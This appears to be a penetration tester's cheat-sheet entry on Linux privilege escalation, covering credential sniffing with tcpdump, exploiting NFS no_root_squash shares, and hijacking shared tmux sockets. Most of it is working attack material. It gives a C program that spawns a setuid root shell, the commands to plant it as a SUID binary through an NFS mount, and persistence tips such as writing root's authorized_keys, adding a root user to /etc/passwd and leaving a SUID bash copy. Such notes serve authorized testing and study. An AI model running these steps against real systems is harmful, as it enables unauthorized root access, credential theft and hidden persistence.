### 1. Technique Name:

Miscellaneous Privilege Escalation â€“ Passive Traffic Capture, Weak NFS, and tmux Hijack
### 2. Summary:

This entry covers three lesser-known but potent privilege escalation techniques:

- Passive Traffic Capture using tools like `tcpdump` to sniff credentials from plaintext protocols.   
- Weak NFS Privileges where poorly configured NFS shares allow writing SUID binaries to escalate to root.
- tmux Session Hijacking where misconfigured or shared tmux sockets permit attaching to root sessions.
### 3. Conditions / Requirements:

- Traffic Capture:    
    - `tcpdump` installed and executable
    - Interface permissions (may need group `wireshark` or `tcpdump`)
    - Network using plaintext or weak protocols (e.g., HTTP, FTP, POP3)    
- Weak NFS:
    - NFS exports with `no_root_squash`
    - Access to mount NFS share (e.g., from attacker box)
    - Ability to compile and copy SUID binary
- tmux Hijacking:
    - Shared tmux socket file (e.g., `/shareds`) accessible and group-readable
    - Attacker is in the same group as the shared socket
### 4. Enumeration Steps:
#### A. Traffic Capture

Check for tcpdump:

```bash
which tcpdump
getcap /usr/sbin/tcpdump
```

Start capture:

```bash
tcpdump -i any -nn -A port 21 or port 80 or port 110 or port 25
```

Analyze using:

```bash
net-creds -i dump.pcap
# or
python3 PCredz.py -f dump.pcap
```
#### B. NFS Misconfiguration

List remote NFS exports:

```bash
showmount -e <target_ip>
```

Check `/etc/exports` on server if accessible:

```bash
cat /etc/exports
```

Look for `no_root_squash` option.
#### C. tmux Session Hijack

Find tmux socket:

```bash
ps aux | grep tmux
ls -l /shareds
```

Check group membership:

```bash
id
```
### 5. Exploitation Steps

#### A. Sniffing Cleartext Credentials

```bash
tcpdump -i eth0 -w dump.pcap
```

Later:

```bash
net-creds -i dump.pcap
# or
wireshark
```

Look for HTTP Basic Auth, POP3, FTP, NetNTLM hashes.
#### B. Weak NFS + SUID Shell

Create C file:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}
```

Compile:

```bash
gcc shell.c -o shell
```

Mount NFS share from attacker box:

```bash
mount -t nfs <target>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

On victim:

```bash
/tmp/shell
# id
uid=0(root) gid=0(root)
```
#### C. Hijack tmux Session

If attacker is in same group:

```bash
tmux -S /shareds
# id
uid=0(root)
```
### 6. Post-Exploitation Tips:

- From NFS:    
    - Place SSH key in `/mnt/root/.ssh/authorized_keys`
    - Add root user to `/mnt/etc/passwd`        
- From sniffed creds:
    - Reuse them for `sudo`, `ssh`, `su` attempts
- From tmux:
    - Drop root shell:

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```
### 7. Example / Notes:

NFS Exploitation:

```bash
gcc shell.c -o shell
mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt && chmod u+s /mnt/shell
```

tmux Example:

```bash
tmux -S /shareds
# id
uid=0(root)
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #NFS #tmux #tcpdump 